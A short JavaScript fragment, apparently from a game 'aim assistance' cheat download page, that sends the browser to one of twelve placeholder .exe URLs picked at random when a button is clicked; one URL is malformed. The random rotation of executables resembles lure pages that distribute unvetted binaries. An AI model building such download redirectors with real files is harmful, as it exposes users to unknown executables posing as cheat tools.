document.getElementById("aimAssistanceBtn").addEventListener("click", function() {
    downloadaim();
});

function downloadaim() {
    var fileUrls = [
        'https://file1.exe',
        'https://file2.exe',
        'https://file3.exe',
        'https://file4.exe',
		'https://file5.exe',
        'https://file6.exe',
        'https://file7.exe',
        'https://file8.exe',
		'https://file9.exe',
        'https://file10.exe',
        'https://file11exe',
        'https://file12.exe',
    ];

    var randomIndex = Math.floor(Math.random() * fileUrls.length);
    var randomFileUrl = fileUrls[randomIndex];

    window.location.href = randomFileUrl;
}

